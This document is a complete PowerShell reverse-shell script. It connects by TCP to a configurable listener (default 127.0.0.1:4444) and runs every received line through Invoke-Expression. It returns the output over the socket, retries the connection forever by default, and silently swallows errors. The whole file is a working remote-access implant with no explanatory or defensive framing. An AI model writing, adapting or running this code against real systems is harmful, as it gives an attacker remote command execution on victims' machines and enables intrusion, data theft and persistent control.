param(
    [string]$Host = "127.0.0.1",
    [int]$Port = 4444,
    [int]$TimeoutMs = 5000,
    [int]$ReconnectDelay = 10,
    [int]$MaxRetries = 0  # 0 = hunt forever
)

function Connect-TCPClient {
    param([string]$Host, [int]$Port, [int]$TimeoutMs)

    $client = New-Object System.Net.Sockets.TcpClient
    $connect = $client.BeginConnect($Host, $Port, $null, $null)
    $waited = $connect.AsyncWaitHandle.WaitOne($TimeoutMs, $false)

    if (-not $waited) {
        $client.Close()
        throw "timeout"
    }

    $client.EndConnect($connect)
    return $client
}

function Invoke-Shell {
    param($Reader, $Writer, $Client)

    while ($Client.Connected) {
        $cmd = $Reader.ReadLine()
        if ($null -eq $cmd -or $cmd -eq "exit") { return $false }

        try {
            $output = iex $cmd 2>&1 | Out-String
        }
        catch {
            $output = "ERROR: $_"
        }

        $Writer.WriteLine($output.TrimEnd())
    }

    return $true  # reconnect
}

$attempt = 0

while ($MaxRetries -eq 0 -or $attempt -lt $MaxRetries) {
    $attempt++
    try {
        $client = Connect-TCPClient -Host $Host -Port $Port -TimeoutMs $TimeoutMs
        $stream  = $client.GetStream()
        $reader  = New-Object System.IO.StreamReader($stream)
        $writer  = New-Object System.IO.StreamWriter($stream)
        $writer.AutoFlush = $true

        $attempt = 0  # reset on successful connection

        $reconnect = Invoke-Shell -Reader $reader -Writer $writer -Client $client
        if (-not $reconnect) { break }
    }
    catch { }
    finally {
        if ($writer) { try { $writer.Close() } catch {} }
        if ($reader) { try { $reader.Close() } catch {} }
        if ($client) { try { $client.Close() } catch {} }
    }

    Start-Sleep -Seconds $ReconnectDelay
}
